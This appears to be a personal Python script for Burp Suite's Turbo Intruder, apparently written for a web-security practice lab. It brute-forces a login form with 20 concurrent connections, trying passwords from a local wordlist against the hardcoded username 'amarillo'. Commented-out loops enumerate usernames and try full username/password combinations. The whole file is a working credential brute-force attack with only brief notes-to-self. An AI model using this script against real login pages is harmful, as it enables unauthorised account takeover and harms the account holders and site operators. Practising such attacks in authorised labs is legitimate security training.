def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=100,
                           pipeline=False
                           )
                           
    #find username
    #for username in open('/home/bacon/Desktop/workspace/users.txt'):
        #engine.queue(target.req, [username.rstrip(), "a"])

     #find username
    for password in open('/home/bacon/Desktop/workspace/passwords.txt'):
        engine.queue(target.req, ["amarillo", password.rstrip()])
        #username found from previous for loop

    #general bruteforce code
    #for username in open('/home/bacon/Desktop/workspace/users.txt'):
      #for password in open('/home/bacon/Desktop/workspace/passwords.txt'):
        #engine.queue(target.req, [username.rstrip(), password.rstrip()])

    #lesson learned: any whitespace character should be stripped (rstrip()) before sending into request

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status > -2:
        table.add(req)
